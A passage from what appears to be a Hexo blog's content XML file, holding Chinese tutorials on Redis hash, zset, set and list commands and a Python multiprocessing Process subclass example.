align="left">name：键名；key：映射键名；value：映射键值</td><td align="left">hset(‘price’, ‘cake’, 5)</td><td align="left">向键为price的散列表中添加映射关系，cake的值为5</td><td align="left">1，即添加的映射个数</td></tr><tr><td align="left">hsetnx(name, key, value)</td><td align="left">如果映射键名不存在，则向键为name的散列表中添加映射</td><td align="left">name：键名；key：映射键名；value：映射键值</td><td align="left">hsetnx(‘price’, ‘book’, 6)</td><td align="left">向键为price的散列表中添加映射关系，book的值为6</td><td align="left">1，即添加的映射个数</td></tr><tr><td align="left">hget(name, key)</td><td align="left">返回键为name的散列表中key对应的值</td><td align="left">name：键名；key：映射键名</td><td align="left">redis.hget(‘price’, ‘cake’)</td><td align="left">获取键为price的散列表中键名为cake的值</td><td align="left">5</td></tr><tr><td align="left">hmget(name, keys, *args)</td><td align="left">返回键为name的散列表中各个键对应的值</td><td align="left">name：键名；keys：映射键名列表</td><td align="left">redis.hmget(‘price’, [‘apple’, ‘orange’])</td><td align="left">获取键为price的散列表中apple和orange的值</td><td align="left">[b’3’, b’7’]</td></tr><tr><td align="left">hmset(name, mapping)</td><td align="left">向键为name的散列表中批量添加映射</td><td align="left">name：键名；mapping：映射字典</td><td align="left">redis.hmset(‘price’, {‘banana’: 2, ‘pear’: 6})</td><td align="left">向键为price的散列表中批量添加映射</td><td align="left">True</td></tr><tr><td align="left">hincrby(name, key, amount=1)</td><td align="left">将键为name的散列表中映射的值增加amount</td><td align="left">name：键名；key：映射键名；amount：增长量</td><td align="left">redis.hincrby(‘price’, ‘apple’, 3)</td><td align="left">key为price的散列表中apple的值增加3</td><td align="left">6，修改后的值</td></tr><tr><td align="left">hexists(name, key)</td><td align="left">键为name的散列表中是否存在键名为键的映射</td><td align="left">name：键名；key：映射键名</td><td align="left">redis.hexists(‘price’, ‘banana’)</td><td align="left">键为price的散列表中banana的值是否存在</td><td align="left">True</td></tr><tr><td align="left">hdel(name, *keys)</td><td align="left">在键为name的散列表中，删除键名为键的映射</td><td align="left">name：键名；keys：映射键名</td><td align="left">redis.hdel(‘price’, ‘banana’)</td><td align="left">从键为price的散列表中删除键名为banana的映射</td><td align="left">True</td></tr><tr><td align="left">hlen(name)</td><td align="left">从键为name的散列表中获取映射个数</td><td align="left">name： 键名</td><td align="left">redis.hlen(‘price’)</td><td align="left">从键为price的散列表中获取映射个数</td><td align="left">6</td></tr><tr><td align="left">hkeys(name)</td><td align="left">从键为name的散列表中获取所有映射键名</td><td align="left">name：键名</td><td align="left">redis.hkeys(‘price’)</td><td align="left">从键为price的散列表中获取所有映射键名</td><td align="left">[b’cake’, b’book’, b’banana’, b’pear’]</td></tr><tr><td align="left">hvals(name)</td><td align="left">从键为name的散列表中获取所有映射键值</td><td align="left">name：键名</td><td align="left">redis.hvals(‘price’)</td><td align="left">从键为price的散列表中获取所有映射键值</td><td align="left">[b’5’, b’6’, b’2’, b’6’]</td></tr><tr><td align="left">hgetall(name)</td><td align="left">从键为name的散列表中获取所有映射键值对</td><td align="left">name：键名</td><td align="left">redis.hgetall(‘price’)</td><td align="left">从键为price的散列表中获取所有映射键值对</td><td align="left">{b’cake’: b’5’, b’book’: b’6’, b’orange’: b’7’, b’pear’: b’6’}</td></tr></tbody></table></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis数据类型zset</title>
      <link href="/posts/27106.html"/>
      <url>/posts/27106.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="数据类型zset"><a href="#数据类型zset" class="headerlink" title="数据类型zset"></a>数据类型<code>zset</code></h2><blockquote><p><code>redis zset</code> :有序集合是<code>string</code>类型元素的集合,且不允许重复的成员.</p><p>每个元素都会关联一个<code>double</code>类型的分数,<code>redis</code>正是通过分数来为集合中的成员进行从小到大的排序.有序集合的成员是唯一的,但分数(<code>score</code>)却可以重复.</p><p>比如排行榜:一个班级的成绩,一个论坛的帖子热度等,有序集合中,每个 元素都有权重<code>score</code>,依次来对元素进行排序.</p></blockquote><h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h3><blockquote><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>zadd key score1 member1 [score2 member2]</code></td><td>向有序集合添加一个或多个成员<br>或者更新已存在成员的<code>score</code></td></tr><tr><td><code>zcard key</code></td><td>获取有序集合的成员数</td></tr><tr><td><code>zcount key min max</code></td><td>计算有序集合指定区间的成员数</td></tr><tr><td><code>zincrby key increment member</code></td><td>指定成员的分数加上增量</td></tr><tr><td><code>zrange key start stop withscores</code></td><td>通过索引返回指定区间的成员</td></tr><tr><td><code>zrangebyscore key min max [withscores] [limit]</code></td><td>通过分数返回指定区间的成员</td></tr><tr><td><code>zrank key member</code></td><td>返回指定成员的索引</td></tr><tr><td><code>zrem key member1 [member2]</code></td><td>移除一个或多个成员</td></tr><tr><td><code>zremrangebyrank key start stop</code></td><td>移除指定索引区间的成员</td></tr><tr><td><code>zremrangebyscore key max min</code></td><td>移除指定分数区间的成员</td></tr><tr><td><code>zrevrange key start stop</code></td><td>返回指定区间的成员,通过索引,<br>分数从低到高.</td></tr><tr><td><code>zrevrangebyscore key max min</code></td><td>返回指定区间的成员,分数从高到低</td></tr><tr><td><code>zrevrank key member</code></td><td>返回指定成员的排名,按分数递减排序</td></tr><tr><td><code>zscore key member</code></td><td>返回有序集合成员分数值</td></tr><tr><td><code>zunionstore destination number key</code></td><td>计算交集,并存储在新<code>key</code> 中.</td></tr><tr><td><code>zinterstore</code></td><td></td></tr><tr><td><code>zscan</code></td><td>迭代</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table></blockquote><h3 id="2-基础操作"><a href="#2-基础操作" class="headerlink" title="2.基础操作"></a>2.基础操作</h3><blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 添加单个元素</span>127.0.0.1:6379<span class="token operator">></span> zadd page_rank 10 google.com<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1<span class="token comment" spellcheck="true"># 添加多个元素</span>127.0.0.1:6379<span class="token operator">></span> zadd page_rank 9 baidu.com 8 bing.com<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 2<span class="token comment" spellcheck="true"># 根据索引获取元素</span>127.0.0.1:6379<span class="token operator">></span> zrange page_rank 0 -1 withscores1<span class="token punctuation">)</span> <span class="token string">"bing.com"</span>2<span class="token punctuation">)</span> <span class="token string">"8"</span>3<span class="token punctuation">)</span> <span class="token string">"baidu.com"</span>4<span class="token punctuation">)</span> <span class="token string">"9"</span>5<span class="token punctuation">)</span> <span class="token string">"google.com"</span>6<span class="token punctuation">)</span> <span class="token string">"10"</span><span class="token comment" spellcheck="true"># 添加重复元素</span>127.0.0.1:6379<span class="token operator">></span> zadd page_rank 10 google.com<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 0<span class="token comment" spellcheck="true"># sort set 中 score可以重复,但是member不可以重复,sortset 不变</span>127.0.0.1:6379<span class="token operator">></span> zrange page_rank 0 -1 withscores1<span class="token punctuation">)</span> <span class="token string">"bing.com"</span>2<span class="token punctuation">)</span> <span class="token string">"8"</span>3<span class="token punctuation">)</span> <span class="token string">"baidu.com"</span>4<span class="token punctuation">)</span> <span class="token string">"9"</span>5<span class="token punctuation">)</span> <span class="token string">"google.com"</span>6<span class="token punctuation">)</span> <span class="token string">"10"</span><span class="token comment" spellcheck="true"># sort set 中 score可以重复,但是member不可以重复,sortset 不变</span><span class="token comment" spellcheck="true"># google.com的score发生改变</span>127.0.0.1:6379<span class="token operator">></span> zadd page_rank 7 google.com<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 0127.0.0.1:6379<span class="token operator">></span> zrange page_rank 0 -1 withscores1<span class="token punctuation">)</span> <span class="token string">"google.com"</span>2<span class="token punctuation">)</span> <span class="token string">"7"</span>3<span class="token punctuation">)</span> <span class="token string">"bing.com"</span>4<span class="token punctuation">)</span> <span class="token string">"8"</span>5<span class="token punctuation">)</span> <span class="token string">"baidu.com"</span>6<span class="token punctuation">)</span> <span class="token string">"9"</span><span class="token comment" spellcheck="true"># 统计信息</span>127.0.0.1:6379<span class="token operator">></span> zcard page_rank<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-交集并集"><a href="#3-交集并集" class="headerlink" title="3.交集并集"></a>3.交集并集</h3><blockquote><p>交集:<code>zinterstore</code></p><p>并集:<code>zunionstore</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis数据类型set</title>
      <link href="/posts/36086.html"/>
      <url>/posts/36086.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="数据类型set"><a href="#数据类型set" class="headerlink" title="数据类型set"></a>数据类型<code>set</code></h2><blockquote><p><code>redis set</code> 是<code>string</code>类型的无序集合.集合的成员是唯一的,不会出现重复数据.</p><p><code>redis set</code> 是通过哈希表实现的,所以添加,删除,查找的复杂度是<code>O(1)</code></p><p><code>redis set</code> 最大成员数是$2^{32} -1$</p></blockquote><h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h3><blockquote><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>sadd key member1 [member2]</code></td><td>向集合中添加一个或多个成员</td></tr><tr><td><code>scard key</code></td><td>获取集合的成员数</td></tr><tr><td><code>sdiff key1 [key2]</code></td><td>求差集</td></tr><tr><td><code>sdiffstore destionation key1 [key2]</code></td><td>求差集并存储在<code>destination</code> 中</td></tr><tr><td><code>sinter key 1 [key2]</code></td><td>求交集</td></tr><tr><td><code>sinterstrore destionation key1 [key2]</code></td><td>求交集并存储在<code>destination</code> 中</td></tr><tr><td><code>sismember key member</code></td><td>判断<code>member</code> 是否是<code>key</code> 的成员</td></tr><tr><td><code>smembers key</code></td><td>返回集合中所有成员</td></tr><tr><td><code>smove source destination member</code></td><td>将元素从一个移动到另外一个</td></tr><tr><td><code>spop key</code></td><td>移除并返回集合中的一个随机元素</td></tr><tr><td><code>srandmember key [count]</code></td><td>返回集合中的一个或多个随机数</td></tr><tr><td><code>srem key member1 [member2]</code></td><td>移除集合 中一个或多个成员</td></tr><tr><td><code>sunion key1 [key2]</code></td><td>求并集</td></tr><tr><td><code>sunionstore destionation key1 [key2]</code></td><td>求并集并存储在<code>destination</code> 中</td></tr><tr><td><code>sscan key cursor</code></td><td>迭代集合中的元素</td></tr></tbody></table></blockquote><h3 id="2-创建集合"><a href="#2-创建集合" class="headerlink" title="2.创建集合"></a>2.创建集合</h3><blockquote><ol><li>创建<code>sadd</code></li><li>获取集合成员数<code>scard</code></li><li>获取集合中所有成员<code>smembers</code></li><li>判断集合中成员<code>sismember</code></li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 添加单个元素</span>127.0.0.1:6379<span class="token operator">></span> sadd bbs <span class="token string">'discuz.net'</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> smembers bbs1<span class="token punctuation">)</span> <span class="token string">"discuz.net"</span><span class="token comment" spellcheck="true"># 添加重复元素</span>127.0.0.1:6379<span class="token operator">></span> sadd bbs <span class="token string">'discuz.net'</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 0127.0.0.1:6379<span class="token operator">></span> smembers bbs1<span class="token punctuation">)</span> <span class="token string">"discuz.net"</span><span class="token comment" spellcheck="true"># 添加多个元素</span>127.0.0.1:6379<span class="token operator">></span> sadd bbs <span class="token string">'tianya.cn'</span>  <span class="token string">'xxx.cn'</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> smembers bbs1<span class="token punctuation">)</span> <span class="token string">"tianya.cn"</span>2<span class="token punctuation">)</span> <span class="token string">"discuz.net"</span>3<span class="token punctuation">)</span> <span class="token string">'xxx.cn'</span><span class="token comment" spellcheck="true"># 统计成员</span>127.0.0.1:6379<span class="token operator">></span> scard bbs<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 3<span class="token comment" spellcheck="true"># 判断成员</span>127.0.0.1:6379<span class="token operator">></span> sismember bbs <span class="token string">'tianya.cn'</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-差集-交集-并集"><a href="#3-差集-交集-并集" class="headerlink" title="3.差集,交集,并集"></a>3.差集,交集,并集</h3><blockquote><p>差集:</p><ul><li><code>sdiff key1 [key2 ]</code> :返回一个集合的所有成员,该集合是给定集合的差集</li><li><code>sdiffstore destination key1 [key2]</code> :返回一个集合的所有成员,该集合是给定集合的差集,并保存在<code>destination</code> 中</li></ul><p>交集:</p><ul><li><code>sinter key1 [key2]</code>:返回一个集合的所有成员,该集合是给定集合的交集</li><li><code>sinterstore key1 [key2]</code>:返回一个集合的所有成员,该集合是给定集合的交集,并保存在<code>destination</code> 中.</li></ul><p>并集:</p><ul><li><code>sunion key1 [key2]</code>:返回一个集合的所有成员,该集合是给定集合的b并集</li><li><code>suionstore key1 [key2]</code>:返回一个集合的所有成员,该集合是给定集合的并集,并保存在<code>destination</code> 中</li></ul><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6379<span class="token operator">></span> sadd JackLang <span class="token string">'Python'</span> <span class="token string">'Java'</span> <span class="token string">'C'</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 3127.0.0.1:6379<span class="token operator">></span> sadd BobLang <span class="token string">'Python'</span> <span class="token string">'Redis'</span> <span class="token string">'MySQL'</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 3127.0.0.1:6379<span class="token operator">></span> <span class="token function">sdiff</span> JackLang BobLang1<span class="token punctuation">)</span> <span class="token string">"Java"</span>2<span class="token punctuation">)</span> <span class="token string">"C"</span>127.0.0.1:6379<span class="token operator">></span> sinter JackLang BobLang1<span class="token punctuation">)</span> <span class="token string">"Python"</span>127.0.0.1:6379<span class="token operator">></span> sunion JackLang BobLang1<span class="token punctuation">)</span> <span class="token string">"Python"</span>2<span class="token punctuation">)</span> <span class="token string">"MySQL"</span>3<span class="token punctuation">)</span> <span class="token string">"Java"</span>4<span class="token punctuation">)</span> <span class="token string">"C"</span>5<span class="token punctuation">)</span> <span class="token string">"Redis"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-删除并返回"><a href="#4-删除并返回" class="headerlink" title="4. 删除并返回"></a>4. 删除并返回</h3><blockquote><ul><li><code>spop key</code> : 移除并返回集合中的一个随机元素.</li><li><code>smem key member1 [member2]</code> :移除集合<code>key</code> 中的一个或多个元素.\</li><li><code>srangermember key count</code> :返回集合中的一个随机元素.如果<code>count</code> 为正数,且小于集合基数,返回<code>count</code>个元素的数据,数组中的元素各不相同.如果<code>count</code> 大于等于集合基数,返回整个集合.<code>count</code> 为负数,返回一个数组,数组中的元素可能会重复出现.</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 添加元素</span>redis<span class="token operator">></span> SADD fruit apple banana cherry<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 3<span class="token comment" spellcheck="true"># 只给定 key 参数，返回一个随机元素</span>redis<span class="token operator">></span> SRANDMEMBER fruit<span class="token string">"cherry"</span>redis<span class="token operator">></span> SRANDMEMBER fruit<span class="token string">"apple"</span><span class="token comment" spellcheck="true"># 给定 3 为 count 参数，返回 3 个随机元素</span><span class="token comment" spellcheck="true"># 每个随机元素都不相同</span>redis<span class="token operator">></span> SRANDMEMBER fruit 31<span class="token punctuation">)</span> <span class="token string">"apple"</span>2<span class="token punctuation">)</span> <span class="token string">"banana"</span>3<span class="token punctuation">)</span> <span class="token string">"cherry"</span><span class="token comment" spellcheck="true"># 给定 -3 为 count 参数，返回 3 个随机元素</span><span class="token comment" spellcheck="true"># 元素可能会重复出现多次</span>redis<span class="token operator">></span> SRANDMEMBER fruit -31<span class="token punctuation">)</span> <span class="token string">"banana"</span>2<span class="token punctuation">)</span> <span class="token string">"cherry"</span>3<span class="token punctuation">)</span> <span class="token string">"apple"</span>redis<span class="token operator">></span> SRANDMEMBER fruit -31<span class="token punctuation">)</span> <span class="token string">"apple"</span>2<span class="token punctuation">)</span> <span class="token string">"apple"</span>3<span class="token punctuation">)</span> <span class="token string">"cherry"</span><span class="token comment" spellcheck="true"># 如果 count 是整数，且大于等于集合基数，那么返回整个集合</span>redis<span class="token operator">></span> SRANDMEMBER fruit 101<span class="token punctuation">)</span> <span class="token string">"apple"</span>2<span class="token punctuation">)</span> <span class="token string">"banana"</span>3<span class="token punctuation">)</span> <span class="token string">"cherry"</span><span class="token comment" spellcheck="true"># 如果 count 是负数，且 count 的绝对值大于集合的基数</span><span class="token comment" spellcheck="true"># 那么返回的数组的长度为 count 的绝对值</span>redis<span class="token operator">></span> SRANDMEMBER fruit -101<span class="token punctuation">)</span> <span class="token string">"banana"</span>2<span class="token punctuation">)</span> <span class="token string">"apple"</span>3<span class="token punctuation">)</span> <span class="token string">"banana"</span>4<span class="token punctuation">)</span> <span class="token string">"cherry"</span>5<span class="token punctuation">)</span> <span class="token string">"apple"</span>6<span class="token punctuation">)</span> <span class="token string">"apple"</span>7<span class="token punctuation">)</span> <span class="token string">"cherry"</span>8<span class="token punctuation">)</span> <span class="token string">"apple"</span>9<span class="token punctuation">)</span> <span class="token string">"apple"</span>10<span class="token punctuation">)</span> <span class="token string">"banana"</span><span class="token comment" spellcheck="true"># SRANDMEMBER 并不会修改集合内容</span>redis<span class="token operator">></span> SMEMBERS fruit1<span class="token punctuation">)</span> <span class="token string">"apple"</span>2<span class="token punctuation">)</span> <span class="token string">"cherry"</span>3<span class="token punctuation">)</span> <span class="token string">"banana"</span><span class="token comment" spellcheck="true"># 集合为空时返回 nil 或者空数组</span>redis<span class="token operator">></span> SRANDMEMBER not-exists<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>redis<span class="token operator">></span> SRANDMEMBER not-eixsts 10<span class="token punctuation">(</span>empty list or set<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义进程子类</title>
      <link href="/posts/45116.html"/>
      <url>/posts/45116.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png" alt="10305"></p><h2 id="自定义进程子类"><a href="#自定义进程子类" class="headerlink" title="自定义进程子类"></a>自定义进程子类</h2><blockquote><p>实现一个自定义进程子类,需要三步:</p><ul><li>定义<code>Process</code> 子类</li><li>覆盖<code>__init__()</code> 方法来添加额外的参数,也可以使用父类的<code>__init__</code></li><li>覆盖<code>run(self)</code> 方法来实现<code>Process</code> 启动的时候执行的任务</li></ul><p>创建<code>Process</code>子类后,可以通过创建它的实例并通过<code>start</code> 方法来启动,启动时自动调用<code>run()</code> 方法</p></blockquote><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>time<span class="token punctuation">,</span>os<span class="token keyword">class</span> <span class="token class-name">MyProcess</span><span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> mytime<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>     self<span class="token punctuation">.</span>mytime <span class="token operator">=</span> mytime     super<span class="token punctuation">(</span>MyProcess<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程启动'</span><span class="token punctuation">)</span>     info <span class="token operator">=</span> <span class="token string">'子进程PID:{},子进程秘钥:{},父进程PID{},子进程名:{}'</span><span class="token punctuation">.</span>format\         <span class="token punctuation">(</span>self<span class="token punctuation">.</span>pid<span class="token punctuation">,</span> self<span class="token punctuation">.</span>authkey<span class="token punctuation">,</span> os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>     time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>self<span class="token punctuation">.</span>mytime<span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程结束'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">"""主程序"""</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主程序启动'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     p <span class="token operator">=</span> MyProcess<span class="token punctuation">(</span>mytime<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主程序结束'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>join()</code> 函数可以让主进程登台其他进程结束最后退出.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis数据类型list</title>
      <link href="/posts/34505.html"/>
      <url>/posts/34505.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="数据类型list"><a href="#数据类型list" class="headerlink" title="数据类型list"></a>数据类型<code>list</code></h2><blockquote><p><code>redis list</code> 是字符串列表,按照插入顺序排序.可以添加一个元素到列表的头部和尾部.</p><p>一个列表最多可以包含$2^{32}-1$ 个元素.</p></blockquote><h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h3><blockquote><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>blpop key1 [key2] timeout</code></td><td>移出并获取列表的第一个元素,如果列表<br>没有元素会阻塞列表直到等待超时或发现可弹出元素为止</td></tr><tr><td><code>brpop key1 [key2] timeout</code></td><td>移出并获取列表的最后一个元素,如果列表<br>没有元素会阻塞列表直到等待超时或发现可弹出元素为止</td></tr><tr><td><code>brpoplpush source destination timeout</code></td><td>从列表中弹出一个值，将弹出的元素插入到<br>另外一个列表中并返回它； 如果列表没有元素会<br>阻塞列表直到等待超时或发现可弹出元素为止。</td></tr><tr><td><code>lindex key index</code></td><td>通过索引获取列表中的元素</td></tr><tr><td>`linsert key before</td><td>after pivot value`</td></tr><tr><td><code>llen key</code></td><td>获取列表长度</td></tr><tr><td><code>lpop key</code></td><td>移出并获取列表的第一个元素</td></tr><tr><td><code>lpush key value1 [value2]</code></td><td>将一个或多个值插入到列表头部</td></tr><tr><td><code>lpushx key value</code></td><td>将一个值插入到已存在的列表头部</td></tr><tr><td><code>lrange key start stop</code></td><td>获取列表指定范围类的元素</td></tr><tr><td><code>lrem key count value</code></td><td>移出列表元素.</td></tr><tr><td><code>lset key index value</code></td><td>通过索引设置列表元素的值</td></tr><tr><td><code>ltrim key start stop</code></td><td>对一个列表进行修剪(trim)，就是说，让列表<br>只保留指定区间内的元素，不在指定区间之内的元素都将被删除</td></tr><tr><td><code>rpop key</code></td><td>移除并获取列表的最后一个元素</td></tr><tr><td><code>rpoplpush source destination</code></td><td>移除列表的最后一个元素，并将该元素添加到另一个列表并返回</td></tr><tr><td><code>rpush key value1 [value2]</code></td><td>在列表末尾添加一个或多个值</td></tr><tr><td><code>rpushx key value</code></td><td>对已存在的列表末尾添加值.</td></tr></tbody></table></blockquote><h3 id="1-添加"><a href="#1-添加" class="headerlink" title="1.添加"></a>1.添加</h3><blockquote><p>添加列表元素</p><p>左添加</p><ul><li><p><code>lpush</code></p></li><li><p><code>lpushx</code></p></li></ul><p>右添加</p><ul><li><p><code>rpush</code></p></li><li><p><code>prushx</code></p></li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 左添加,</span><span class="token comment" spellcheck="true"># 添加单个元素</span>127.0.0.1:6379<span class="token operator">></span> lpush languages python<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1<span class="token comment" spellcheck="true"># 添加重复元素</span>127.0.0.1:6379<span class="token operator">></span> lpush languages python<span class="token punctuation">(</span>integer<span class="token 